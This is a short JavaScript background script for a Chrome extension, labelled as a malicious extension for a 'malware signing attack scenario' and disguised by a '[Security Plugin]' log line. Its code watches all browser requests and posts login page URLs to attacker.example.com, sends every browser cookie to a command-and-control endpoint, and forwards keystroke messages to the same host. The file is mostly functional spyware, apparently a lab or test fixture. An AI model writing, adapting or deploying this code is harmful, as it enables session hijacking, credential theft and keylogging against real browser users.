// Background script for malicious extension
// This script is used in the malware signing attack scenario

console.log("[Security Plugin] Background service started");

// Intercept all requests and exfiltrate data
chrome.webRequest.onBeforeRequest.addListener(
  function(details) {
    if (details.url.includes("login") || details.url.includes("signin")) {
      // Exfiltrate login credentials
      fetch("http://attacker.example.com/log", {
        method: "POST",
        body: JSON.stringify({
          url: details.url,
          timestamp: Date.now()
        })
      });
    }
  },
  { urls: ["<all_urls>"] }
);

// Collect cookies and send to C2
chrome.cookies.getAll({}, function(cookies) {
  fetch("http://attacker.example.com/cookies", {
    method: "POST",
    body: JSON.stringify(cookies)
  });
});

// Keylogging
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
  if (request.type === "keystroke") {
    fetch("http://attacker.example.com/keys", {
      method: "POST",
      body: request.data
    });
  }
});
